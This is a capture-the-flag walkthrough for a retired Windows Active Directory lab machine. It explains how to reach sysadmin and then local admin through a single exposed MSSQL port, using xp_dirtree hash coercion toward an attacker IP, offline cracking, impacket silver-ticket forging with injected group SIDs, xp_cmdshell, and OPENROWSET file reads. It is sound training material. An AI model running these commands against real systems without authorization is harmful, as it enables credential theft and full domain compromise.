# Signed — walkthrough

> Assume-breach Windows / Active Directory box. You start with one MSSQL login and
> nothing else reachable. The whole path lives inside a single open port — 1433 —
> and the lesson is that a *firewalled KDC does not switch Kerberos off*.

Flags redacted (`<32-hex-flag>`). Publishable as the machine is retired.

## Recon

A full scan finds exactly one TCP port:

```
1433/tcp open  ms-sql-s   Microsoft SQL Server 2022 (16.0.1000) — DC01.SIGNED.HTB
```

Everything else — SMB, LDAP, Kerberos (88), WinRM, RDP — is dropped. UDP 53 (DNS)
answers read-only. So this is a domain controller with only its database exposed,
and the DC can reach *out* (that matters later).

## Foothold: from `guest` to a cracked service account

The provided `scott` login maps to `guest`: no user databases, no impersonation,
no linked servers, `xp_cmdshell`/OLE/CLR all off, and every escalation write
(`ALTER SERVER ROLE`, `CREATE LOGIN`, `sp_configure`) denied. A guest MSSQL login
is still a primitive, though — the directory extended procedures are runnable by
`public`, and they make the *SQL service account* authenticate outbound:

```sql
EXEC master..xp_dirtree '\\<tun0-ip>\x', 1, 1;
```

Point Responder (or `smbserver`) at it and you capture a **NetNTLMv2 for
`SIGNED\mssqlsvc`**, crackable offline with hashcat mode 5600. Now you hold the
service account's password.

## The wall (and the wrong assumption that builds it)

`mssqlsvc` logs in… also as `guest`. So what was the point of cracking it?

Enumerating through the SQL connection — MSSQL resolves domain SIDs even with no AD
port open — gives the answer. RID-cycling `SUSER_SNAME()` yields the full user
roster, and the server roles show the tell:

```
sysadmin  <-  SIGNED\IT   (WINDOWS_GROUP)
```

**A domain group is a database sysadmin.** Get into `SIGNED\IT` and you own the DB.
But you can't: no password reuse, LDAP/Kerberos are firewalled so no
Kerberoast/AS-REP/BloodHound, and there's no in-SQL escalation class available.

The trap here is easy to fall into: *"port 88 is filtered, therefore no Kerberos
attacks."* That's true for anything that talks to the KDC — but not for a **silver
ticket**.

## Silver ticket: Kerberos without the KDC

A service account's key is exactly the key its service uses to *decrypt* tickets.
Hold that key and you can forge a TGS **offline** — for any SPN the account owns —
and hand it straight to the service. The KDC is never involved, so a blocked port
88 is irrelevant. And because the service trusts whatever its own key decrypts, you
put whatever group membership you want into the PAC.

`SIGNED\IT` is RID 1105 (`SUSER_SID('SIGNED\IT')`). Forge a ticket for the MSSQL
SPN with that RID injected:

```bash
impacket-ticketer -nthash <mssqlsvc-nt-hash> \
  -domain-sid <DOMAIN-SID> -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 \
  -groups 1105 -user-id 1103 mssqlsvc
KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -no-pass -k DC01.signed.htb
```

Two details that cost time if you miss them:

- **Get the domain SID byte-exact.** The injected RIDs are relative to it; a wrong
  SID silently forms groups that match nothing and the login just "fails."
- **Connect as the service account's own RID** (`-user-id 1103`), not ticketer's
  default `500`. If the ticket claims to be `Administrator` (RID 500), later
  `OPENROWSET(BULK)` has to cross-impersonate that Windows identity and dies with
  **OS error 1346**. As the service's own identity there's no impersonation hop.

Now you're `sysadmin`. Enable `xp_cmdshell` and you have RCE as `signed\mssqlsvc` —
whose Desktop happens to hold `user.txt`.

```
user.txt — <32-hex-flag>
```

## Root: BULK file read as a local admin

The `xp_cmdshell` token has `SeImpersonate` stripped (SQL Server drops it), so the
usual potato route needs extra work. There's a cleaner way: forge the ticket again,
this time also injecting **`BUILTIN\Administrators`** (`S-1-5-32-544`) as an extra
SID. The resulting token is a local admin for file access, and as `sysadmin` you can
`OPENROWSET(BULK …)`:

```bash
impacket-ticketer -nthash <hash> -domain-sid <SID> -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb:1433 \
  -groups 512,1105 -extra-sid S-1-5-32-544 -user-id 1103 mssqlsvc
```

```sql
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
```

```
root.txt — <32-hex-flag>
```

The same primitive reads the Administrator's PowerShell history, which — as a bonus
— contained the provisioning script with every domain user's plaintext password.

## Takeaways

- A **guest MSSQL login is a coercion primitive**; the directory procs are open to
  `public`.
- **A cracked service-account password is a Kerberos key, not just a logon
  credential.** Silver tickets are offline and reach the service directly, so a
  firewalled KDC is not a defence.
- When a **domain group is granted `sysadmin`**, one silver ticket with that RID in
  the PAC is instant database compromise.
- For file read, connect **as the service account** (avoid error 1346) and inject
  `BUILTIN\Administrators` for a local-admin token — often cleaner than a potato.
